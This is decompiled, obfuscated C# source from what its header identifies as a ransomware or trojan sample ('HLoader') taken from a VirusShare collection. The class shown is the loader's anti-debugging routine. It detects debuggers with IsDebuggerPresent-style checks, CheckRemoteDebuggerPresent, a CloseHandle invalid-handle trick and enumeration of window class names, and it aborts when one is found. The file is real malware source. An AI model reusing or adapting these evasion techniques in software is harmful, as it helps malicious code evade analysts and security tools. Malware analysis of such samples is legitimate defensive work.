// Decompiled with JetBrains decompiler
// Type: A.cf69e2e13803c37ebbe77084c86d21712
// Assembly: HLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4C828FA1-EFB7-4355-AAE8-0E5D4BCC5CDE
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Trojan.Win32.Generic-6be46740efd7af5cb6c16a02b4b48d494f89710b475ba2819b0a9938afc1c52e.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace A
{
  internal sealed class cf69e2e13803c37ebbe77084c86d21712
  {
    internal const uint c3c5e252d5b4d85feb3c47834bf7ace25 = 1024;
    internal const uint c1f3d989af3337ef501256d568451e24d = 64;
    internal const int cda0c8813a3f5e22e1ec8b42781be95b4 = 0;
    private static bool cd016d9877aa5a740559d31e86135b0fe;

    [DllImport("kernel32.dll", EntryPoint = "SetLastError")]
    internal static extern void c1b4a4fd4428bd064416c4bb5f332d5d2(uint _param0);

    [DllImport("kernel32.dll", EntryPoint = "CloseHandle")]
    internal static extern int ca4f3a576915966e3aaf64a83c9d7d730(IntPtr _param0);

    [DllImport("kernel32.dll", EntryPoint = "OpenProcess")]
    internal static extern IntPtr c10242de89a53df81cbcbdc3d11589749(
      uint _param0,
      int _param1,
      uint _param2);

    [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcessId")]
    internal static extern uint c4c3ea2f41edae9dccebcfc7656f6fdfe();

    [DllImport("kernel32.dll", EntryPoint = "LoadLibrary", CharSet = CharSet.Auto, SetLastError = true)]
    internal static extern IntPtr cf1fd489d6f091e2e169dd24c56c74ba2(string _param0);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.ca39816fa26cd645d0b9d02399fd21b1a ce313f93b996f35f3bbc5bff093f8cfba(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.c529233d3c9389fa253a40579328b2017 cedc8881d9225be6998422bac6dd68dec(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.c9b955510f8129ed945a38d443b6589a8 cf23c0613c8227bbf474413ada972cd6d(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.c6b59ff7e55f9c1910aca48a94765cf1c c053cf9df86f722c1e1470702b0d51722(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.c05a8ef0e1799f52325721fba919f700d c73034d08ad29cceb260907c2eb729fbd(
      IntPtr _param0,
      string _param1);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", CharSet = CharSet.Ansi)]
    internal static extern cf69e2e13803c37ebbe77084c86d21712.c3cf670014354890a48bb9afbef75ed36 cb3da7d5cb2beddc92b23b4eced7938af(
      IntPtr _param0,
      string _param1);

    private static int cb88d695ccafe3b4ad5e99a1e047dec39(IntPtr _param0, IntPtr _param1)
    {
      string[] strArray = new string[1]
      {
        c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(114)
      };
      string str1 = cf69e2e13803c37ebbe77084c86d21712.ce99a36d5d873748e5097cc02d464335e(_param0);
      foreach (string str2 in strArray)
      {
        if (ca97176f406a0f2f627ec535c35a57348.c5c2d9d521d5949d90f48b02be3c846f0(str1, str2, true) == 0)
        {
          cf69e2e13803c37ebbe77084c86d21712.cd016d9877aa5a740559d31e86135b0fe = true;
          return 0;
        }
      }
      return 1;
    }

    [DllImport("user32.dll", EntryPoint = "GetClassName", CharSet = CharSet.Auto)]
    internal static extern int ce85b7fa2432bf068f86a6a1fcf8958d1(
      IntPtr _param0,
      StringBuilder _param1,
      int _param2);

    internal static string ce99a36d5d873748e5097cc02d464335e(IntPtr _param0)
    {
      StringBuilder stringBuilder = ccc34c77710bea879d067b169fd471f2b.c5c2d9d521d5949d90f48b02be3c846f0(260);
      cf69e2e13803c37ebbe77084c86d21712.ce85b7fa2432bf068f86a6a1fcf8958d1(_param0, stringBuilder, c64a4d567db5be6ddc6a0e98460974eb1.c51524f9fe9e0b8933f9d1c49ca790811((object) stringBuilder));
      return c10c309cd1770a378fed6c3ed7bfff823.c51524f9fe9e0b8933f9d1c49ca790811((object) stringBuilder);
    }

    internal static void c9b9d9b34d684b0eb5dbbc11469e4afa0()
    {
      if (cf69e2e13803c37ebbe77084c86d21712.c31a827a70cbe3996f83315bbc1a1f2b7())
        throw cf9b9ab96c6cde3bb9a945501e0365342.c5c2d9d521d5949d90f48b02be3c846f0(c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(129));
    }

    internal static bool c31a827a70cbe3996f83315bbc1a1f2b7()
    {
      try
      {
        if (c03afb6df2e324d12d3e204672d057b31.c5c2d9d521d5949d90f48b02be3c846f0())
          return true;
        IntPtr num1 = cf69e2e13803c37ebbe77084c86d21712.cf1fd489d6f091e2e169dd24c56c74ba2(c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(285));
        cf69e2e13803c37ebbe77084c86d21712.c6b59ff7e55f9c1910aca48a94765cf1c c6b59ff7e55f9c1910aca48a94765cf1c = cf69e2e13803c37ebbe77084c86d21712.c053cf9df86f722c1e1470702b0d51722(num1, c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(310));
        if (c6b59ff7e55f9c1910aca48a94765cf1c != null && c7ffa854184dad288ee2bfefa20a2f234.c51524f9fe9e0b8933f9d1c49ca790811((object) c6b59ff7e55f9c1910aca48a94765cf1c) != 0)
          return true;
        IntPtr num2 = cf69e2e13803c37ebbe77084c86d21712.c10242de89a53df81cbcbdc3d11589749(1024U, 0, cf69e2e13803c37ebbe77084c86d21712.c4c3ea2f41edae9dccebcfc7656f6fdfe());
        if (c26af154d192101574d0448a8c0af9ecf.c5c2d9d521d5949d90f48b02be3c846f0(num2, IntPtr.Zero))
        {
          try
          {
            cf69e2e13803c37ebbe77084c86d21712.c9b955510f8129ed945a38d443b6589a8 c9b955510f8129ed945a38d443b6589a8 = cf69e2e13803c37ebbe77084c86d21712.cf23c0613c8227bbf474413ada972cd6d(num1, c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(345));
            if (c9b955510f8129ed945a38d443b6589a8 != null)
            {
              int num3 = 0;
              if (c56875ffb354d3203f3617ac21e798bb1.c51524f9fe9e0b8933f9d1c49ca790811((object) c9b955510f8129ed945a38d443b6589a8, num2, ref num3) != 0)
              {
                if (num3 != 0)
                  return true;
              }
            }
          }
          finally
          {
            cf69e2e13803c37ebbe77084c86d21712.ca4f3a576915966e3aaf64a83c9d7d730(num2);
          }
        }
        bool flag = false;
        try
        {
          cf69e2e13803c37ebbe77084c86d21712.ca4f3a576915966e3aaf64a83c9d7d730(new IntPtr(305419896));
        }
        catch
        {
          flag = true;
        }
        if (flag)
          return true;
        try
        {
          cf69e2e13803c37ebbe77084c86d21712.c3cf670014354890a48bb9afbef75ed36 c3cf670014354890a48bb9afbef75ed36 = cf69e2e13803c37ebbe77084c86d21712.cb3da7d5cb2beddc92b23b4eced7938af(cf69e2e13803c37ebbe77084c86d21712.cf1fd489d6f091e2e169dd24c56c74ba2(c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(398)), c1c8f9ee6019281cce23195ec8e5e85f6.cedf2f98ca59b8eab88786b8e851c4e5f(419));
          if (c3cf670014354890a48bb9afbef75ed36 != null)
          {
            cf69e2e13803c37ebbe77084c86d21712.cd016d9877aa5a740559d31e86135b0fe = false;
            c5582ed2e4c36edcc4bbcefab320ef526.c51524f9fe9e0b8933f9d1c49ca790811((object) c3cf670014354890a48bb9afbef75ed36, new cf69e2e13803c37ebbe77084c86d21712.cbe7ebab32931a9a94dc59e73976cb146(cf69e2e13803c37ebbe77084c86d21712.cb88d695ccafe3b4ad5e99a1e047dec39), IntPtr.Zero);
            if (cf69e2e13803c37ebbe77084c86d21712.cd016d9877aa5a740559d31e86135b0fe)
              return true;
          }
        }
        catch
        {
        }
      }
      catch
      {
      }
      return false;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal sealed class c0f3048876295d8d1942b9857c0a42f02
    {
      internal IntPtr cc5c74779d702efbec45dac6c4b788fbb;
      internal IntPtr cf001ccf1dccfde47ad45ceb771a4a556;
      internal IntPtr c4855898a3fdcfecd2230e8e512469151;
      internal IntPtr cf6b0eff2e18b4c1f16cd669961c3a24c;
      internal IntPtr cfafb174e11c50653a681cd9c3dc86e2d;
      internal IntPtr ce6983ec85e0195f03b89e0514749ed86;
    }

    internal delegate int ca39816fa26cd645d0b9d02399fd21b1a(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      cf69e2e13803c37ebbe77084c86d21712.c0f3048876295d8d1942b9857c0a42f02 ProcessInformation,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int c529233d3c9389fa253a40579328b2017(
      IntPtr ProcessHandle,
      int ProcessInformationClass,
      out uint debugPort,
      uint ProcessInformationLength,
      out uint ReturnLength);

    internal delegate int c6b59ff7e55f9c1910aca48a94765cf1c();

    internal delegate void c05a8ef0e1799f52325721fba919f700d([MarshalAs(UnmanagedType.LPStr)] string lpOutputString);

    internal delegate int c9b955510f8129ed945a38d443b6589a8(
      IntPtr hProcess,
      ref int pbDebuggerPresent);

    internal delegate int cbe7ebab32931a9a94dc59e73976cb146(IntPtr wnd, IntPtr lParam);

    internal delegate int c3cf670014354890a48bb9afbef75ed36(
      cf69e2e13803c37ebbe77084c86d21712.cbe7ebab32931a9a94dc59e73976cb146 lpEnumFunc,
      IntPtr lParam);
  }
}
